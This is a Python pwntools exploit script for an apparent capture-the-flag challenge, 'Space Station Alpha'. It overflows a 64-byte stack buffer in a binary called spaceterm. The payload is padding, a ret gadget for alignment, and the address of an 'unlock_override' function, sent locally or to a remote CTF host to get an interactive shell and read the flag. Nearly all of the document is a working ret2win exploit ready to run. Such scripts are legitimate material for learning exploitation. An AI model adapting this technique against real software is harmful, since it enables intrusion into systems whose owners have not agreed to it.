#!/usr/bin/env python3
"""
Space Station Alpha - Exploit Script
=====================================

Exploits the stack buffer overflow in the spaceterm binary
to spawn a shell and retrieve the flag.

Usage:
    python3 exploit.py          # Local exploitation
    python3 exploit.py REMOTE   # Remote exploitation
"""

from pwn import *
import sys

# ==============================================================================
# Configuration
# ==============================================================================

BINARY = "./spaceterm"

# Remote server configuration
REMOTE_HOST = "ctf.neocyberrange.com"
REMOTE_PORT = 9003

# Exploitation parameters
BUFFER_SIZE = 64
RBP_SIZE = 8
OFFSET = BUFFER_SIZE + RBP_SIZE

# ==============================================================================
# Setup
# ==============================================================================

context.arch = 'amd64'
context.os = 'linux'
context.log_level = "info"

elf = ELF(BINARY, checksec=False)

# ==============================================================================
# Find Target Address & Gadgets
# ==============================================================================

target_addr = elf.symbols.get("unlock_override")

if target_addr is None:
    log.error("Could not find 'unlock_override' symbol!")
    target_addr = 0x401176
    log.warning(f"Using hardcoded address: {hex(target_addr)}")
else:
    log.success(f"Found unlock_override at: {hex(target_addr)}")

rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]
log.success(f"Found ret gadget at: {hex(ret_gadget)}")

# ==============================================================================
# Build Payload
# ==============================================================================

def build_payload():
    """Build the exploit payload with stack alignment."""
    payload = b""
    payload += b"A" * OFFSET
    payload += p64(ret_gadget)
    payload += p64(target_addr)
    
    return payload

# ==============================================================================
# Exploitation
# ==============================================================================

def exploit():
    """Run the exploit and drop into interactive shell."""
    
    if len(sys.argv) >= 2 and sys.argv[1] == 'REMOTE':
        log.info(f"Connecting to {REMOTE_HOST}:{REMOTE_PORT}")
        p = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        log.info(f"Starting local process: {BINARY}")
        p = process(BINARY)
    
    payload = build_payload()
    log.info(f"Payload size: {len(payload)} bytes")
    log.info(f"Target address: {hex(target_addr)}")
    
    p.recvuntil(b"ACCESS CODE > ")
    log.info("Sending payload...")
    p.sendline(payload)
    
    log.success("Exploit sent! Dropping to interactive shell...")
    log.info("Run 'cat flag.txt' to get the flag!")
    
    p.interactive()

# ==============================================================================
# Main
# ==============================================================================

if __name__ == "__main__":
    exploit()
